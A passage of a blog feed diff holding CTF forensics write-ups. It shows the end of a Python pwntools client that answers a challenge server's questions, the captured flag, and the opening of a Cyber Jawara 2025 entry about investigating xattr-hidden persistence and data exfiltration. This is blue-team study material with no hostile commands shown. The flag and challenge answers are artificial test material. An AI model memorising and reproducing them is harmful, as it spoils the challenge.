+            <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">))</span>
+
+
+            <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Sending: </span><span class="si">{</span><span class="n">ans</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
+        <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+            <span class="n">log</span><span class="p">.</span><span class="nf">warning</span><span class="p">(</span><span class="sh">"</span><span class="s">Server memutus koneksi (EOF)</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">break</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+<p><img src="/assets/breached/49.png" alt="alt text" />
+FLAG : 
+C2C{someone_just_rooted_ur_server_hahaha_3d9a39663bf2}</p>]]></content><author><name>Jaysen</name></author><category term="CTF" /><category term="Forensics" /><category term="DFIR" /><category term="DigitalForensics" /><category term="DFIR" /><category term="Linux" /><category term="WordPress" /><category term="WebShell" /><category term="MalwareAnalysis" /><category term="ReverseEngineering" /><category term="PrivilegeEscalation" /><category term="Persistence" /><category term="Ransomware" /><summary type="html"><![CDATA[This challenge is a very interesting and fun forensic scenario. We are placed in the role of the blue team, tasked with investigating a compromised virtual machine and reconstructing the entire attack purely from artifacts.]]></summary></entry><entry><title type="html">Unorthodox Part 1 – Cyber Jawara Qual 2025</title><link href="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/" rel="alternate" type="text/html" title="Unorthodox Part 1 – Cyber Jawara Qual 2025" /><published>2026-01-17T00:00:00+07:00</published><updated>2026-01-17T00:00:00+07:00</updated><id>http://localhost:4000/CyberJawara2025-Unorthodox%20Part%201</id><content type="html" xml:base="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/"><![CDATA[<p>On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.</p>
 
 <p>Unorthodox – Part 1 stood out as a particularly interesting challenge due to its realistic investigation flow, especially in the later stage where the attacker leveraged <strong>less common persistence techniques</strong>. Instead of relying on obvious indicators of compromise, the challenge required careful review of package installation logs and extended file attributes to uncover a stealthy payload hidden using <strong>xattr</strong>, which was planted months before the actual data exfiltration took place.</p>
 
